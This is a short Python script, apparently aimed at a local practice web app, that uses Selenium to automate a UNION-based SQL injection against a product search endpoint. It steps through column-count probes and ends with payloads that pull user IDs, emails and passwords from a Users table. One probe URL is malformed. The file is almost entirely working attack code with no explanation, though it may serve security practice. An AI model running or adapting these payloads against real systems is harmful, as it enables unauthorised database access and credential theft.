import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

class SQLInjection:
    
    def __init__(self, base_url, sql_query=None):
        self.base_url = base_url
        self.sql_query = sql_query
        self.chrome_options = Options()
        self.chrome_options.add_argument("--no-sandbox")
        self.chrome_options.add_argument("--window-size=1480,996")

        
    def run(self):
        self.driver = webdriver.Chrome(options=self.chrome_options)
        time.sleep(2)
        self.driver.get(self.base_url + self.sql_query)

    def run_tryhard(self):
        self.driver = webdriver.Chrome(options=self.chrome_options)
        self.driver.get(self.base_url)
        time.sleep(2)
        self.driver.get(self.base_url + "/rest/products/search?q=")
        time.sleep(2)
        # Comment last part with no error 
        self.driver.get(self.base_url + "/rest/products/search?q='))--")
        time.sleep(2)
        # find out correct amount of columns 
        # UNION SELECT '1', '2', '3', '4' FROM Users
        self.driver.get(self.base_url + "/rest/products/search?q='))%20UNION%20SELECT%20%271%27%2C%20%272%27%2C%20%273%27%2C%20%274%27%20FROM%20Users--")
        time.sleep(2)
        # UNION SELECT '1', '2', '3', '4', '5' FROM Users 
        self.driver.get(self.base_url + "/rest/products/search?q='))%20UNION%20SELECT%20%271%27%2C%20%272%27%2C%20%273%27%2C%20%274%27%2C%20%275%27%20FROM%20Users--")
        time.sleep(2)
        # UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users
        self.driver.get(self.base_url + "/rest/products/search?q='))%20UNION%20SELECT%20%271%27%2C%20%272%27%2C%20%273%27%2C%20%274%27%2C%20%275%27%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%2C%20FROM%20Users--")
        time.sleep(2)
        self.driver.get(self.base_url + "/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20email%2C%20%272%27%2C%20%273%27%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--")
        time.sleep(2)
        self.driver.get(self.base_url + "/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--")

if __name__ == "__main__":
    
    user_cred_injection = SQLInjection(base_url="http://localhost:3000",sql_query="/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--")
    user_cred_injection.run()

